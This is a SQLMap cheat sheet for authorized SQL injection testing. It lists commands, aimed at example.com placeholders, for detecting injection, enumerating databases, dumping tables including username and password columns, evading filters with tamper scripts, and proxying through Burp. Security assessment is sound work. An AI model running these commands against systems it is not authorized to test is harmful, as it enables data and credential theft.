# SQLMap

---

## Executive Summary

SQLMap automates SQL injection testing and database enumeration.

Use this cheatsheet for quick command lookup when validating SQL injection in authorized labs or assessments.

## Basic Usage

Test a URL parameter:

```bash
sqlmap -u "http://example.com/item?id=1"
```

Batch mode:

```bash
sqlmap -u "http://example.com/item?id=1" --batch
```

Increase risk and level:

```bash
sqlmap -u "http://example.com/item?id=1" --risk 3 --level 5
```

Specify database type:

```bash
sqlmap -u "http://example.com/item?id=1" --dbms=mysql
```

## Request Files

Save a request from Burp and run:

```bash
sqlmap -r request.txt
```

Batch mode with request file:

```bash
sqlmap -r request.txt --batch
```

Specify parameter:

```bash
sqlmap -r request.txt -p id
```

## Enumeration

List databases:

```bash
sqlmap -u "http://example.com/item?id=1" --dbs
```

List tables:

```bash
sqlmap -u "http://example.com/item?id=1" -D DATABASE --tables
```

List columns:

```bash
sqlmap -u "http://example.com/item?id=1" -D DATABASE -T TABLE --columns
```

Dump table:

```bash
sqlmap -u "http://example.com/item?id=1" -D DATABASE -T TABLE --dump
```

Dump specific columns:

```bash
sqlmap -u "http://example.com/item?id=1" -D DATABASE -T TABLE -C username,password --dump
```

## Authentication

Add cookie:

```bash
sqlmap -u "http://example.com/item?id=1" --cookie="session=VALUE"
```

Use headers:

```bash
sqlmap -u "http://example.com/item?id=1" -H "Authorization: Bearer TOKEN"
```

Use request file from Burp:

```bash
sqlmap -r request.txt
```

## POST Requests

Test POST data:

```bash
sqlmap -u "http://example.com/login" --data="username=admin&password=test"
```

Test JSON body:

```bash
sqlmap -u "http://example.com/api" \
  --data='{"id":1}' \
  -H "Content-Type: application/json"
```

## Detection Options

Technique selection:

```bash
sqlmap -u "http://example.com/item?id=1" --technique=BEUSTQ
```

Common technique letters:

| Letter | Technique |
|---|---|
| `B` | Boolean-based blind |
| `E` | Error-based |
| `U` | UNION query |
| `S` | Stacked queries |
| `T` | Time-based blind |
| `Q` | Inline queries |

Time-based tuning:

```bash
sqlmap -u "http://example.com/item?id=1" --technique=T --time-sec=5
```

## Tamper Scripts

List tamper scripts:

```bash
sqlmap --list-tampers
```

Use tamper script:

```bash
sqlmap -u "http://example.com/item?id=1" --tamper=space2comment
```

Multiple tampers:

```bash
sqlmap -u "http://example.com/item?id=1" --tamper=between,randomcase,space2comment
```

## Proxying

Proxy through Burp:

```bash
sqlmap -u "http://example.com/item?id=1" --proxy=http://127.0.0.1:8080
```

Proxy request file through Burp:

```bash
sqlmap -r request.txt --proxy=http://127.0.0.1:8080
```

Ignore TLS errors:

```bash
sqlmap -u "https://example.com/item?id=1" --ignore-ssl-errors
```

## Useful Options

| Option | Purpose |
|---|---|
| `--batch` | Use default answers |
| `--dbs` | List databases |
| `--tables` | List tables |
| `--columns` | List columns |
| `--dump` | Dump data |
| `-D` | Select database |
| `-T` | Select table |
| `-C` | Select columns |
| `-p` | Select parameter |
| `--cookie` | Add cookie |
| `-H` | Add header |
| `--proxy` | Use proxy |
| `--risk` | Risk level |
| `--level` | Test depth |
| `--tamper` | Apply tamper script |

## Practical Workflow

| Phase | Command |
|---|---|
| Capture request | Save from Burp |
| Test request | `sqlmap -r request.txt --batch` |
| Focus parameter | `sqlmap -r request.txt -p PARAM --batch` |
| Enumerate DBs | `sqlmap -r request.txt --dbs` |
| Enumerate tables | `sqlmap -r request.txt -D DB --tables` |
| Dump target table | `sqlmap -r request.txt -D DB -T TABLE --dump` |

## Notes

- Always validate SQL injection manually when possible.
- Request files from Burp are usually cleaner than long command-line URLs.
- Use `--risk` and `--level` carefully because they increase test intensity.
- Dump only what is authorized and necessary.
- SQLMap traffic can be noisy and easy to detect.